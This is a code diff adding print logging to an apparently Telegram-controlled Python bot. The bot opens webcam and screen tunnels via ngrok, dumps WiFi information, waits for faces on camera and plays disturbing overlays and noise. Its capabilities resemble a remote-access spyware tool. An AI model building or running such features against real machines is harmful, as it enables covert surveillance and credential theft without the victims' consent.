+        print("Stopping webcam and screen tunnel")
         if self.webcam_and_screen_url:
             self.tunnelhandler.stop_service("webcamandscreen")
             self.webcam_and_screen_url = None
@@ -2032,6 +2156,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"📸🖥️ You have no Webcam & Screen tunnel opened")
 
     def stop_webcam_tunnel(self, verbose=True) -> None:
+        print("Stopping webcam tunnel")
         if self.webcam_url:
             self.closecap()
             self.tunnelhandler.stop_service("webcam")
@@ -2043,6 +2168,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"📸 You have no Webcam tunnel opened")
 
     def stop_screen_tunnel(self, verbose=True) -> None:
+        print("Stopping screen tunnel")
         if self.screen_url:
             self.tunnelhandler.stop_service("screen")
             self.screen_url = None
@@ -2053,6 +2179,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"🖥️ You have no Screen tunnel opened")
 
     def stop_all_tunnels(self) -> None:
+        print("Stopping all tunnels")
         e = self.new_editable_message("Closing all tunnels..")
         self.stop_screen_tunnel(False)
         self.stop_webcam_and_screen_tunnel(False)
@@ -2061,6 +2188,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         e.delete()
 
     def start_webcam_and_screen_tunnel(self) -> None:
+        print("Starting webcam and screen tunnel")
         self.stop_all_tunnels()
         if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
             if self.webcam_and_screen_url is None:
@@ -2085,6 +2213,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def start_webcam_tunnel(self) -> None:
+        print("Starting webcam tunnel")
         self.stop_all_tunnels()
         if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
             if self.webcam_url is None:
@@ -2107,6 +2236,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def start_screen_tunnel(self) -> None:
+        print("Starting screen tunnel")
         self.stop_all_tunnels()
         if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
             if self.screen_url is None:
@@ -2129,6 +2259,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def send_prompt(self, question: str) -> str:
+        print(f"Sending prompt: {question}")
         self.bsend(question)
         self.user["status"]="input_requested"
         self.user["last_response"]=None
@@ -2141,6 +2272,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return tmp
 
     def start(self) -> None:
+        print("Starting bot")
         STARTING_LOG_MESSAGE = self.new_editable_message("STARTING")
         #Getting rid of old shi
         try:
@@ -2207,6 +2339,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.running = False
 
     def stop(self) -> None:
+        print("Stopping bot")
         if self.ask_yesno():
             self.running = False
             self.clear()
@@ -2217,9 +2350,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend("Operation stopped.")
 
     def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
+        print("Running test")
         ...
 
     def update_commands(self) -> bool:
+        print("Updating commands")
         commands = self.extract_commands()
         url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
         payload = {'commands': commands}
@@ -2227,6 +2362,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         return response.status_code == 200
 
     def waitforface(self, timeout=60):
+        print(f"Waiting for face for {timeout} seconds")
         start = time()
         self.opencap()
         cap = self.cap
@@ -2244,12 +2380,15 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.closecap()
 
     def wifiinfo(self) -> None:
+        print("Getting WiFi info")
         self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")
 
     def wrapper_for_hdmi_overlay(self, timeout_seconds: int) -> None:
+        print(f"Starting HDMI overlay for {timeout_seconds} seconds")
         Thread(target=self.overlay_opencv.run(timeout_seconds)).start()
 
     def disturbed_overlay_and_random_noise(self, duration: int) -> None:
+        print(f"Starting disturbed overlay and noise for {duration} seconds")
         self.wrapper_for_hdmi_overlay(duration)
         t2 = Thread(target=play_random_noise, args=(duration,))
         t2.start()
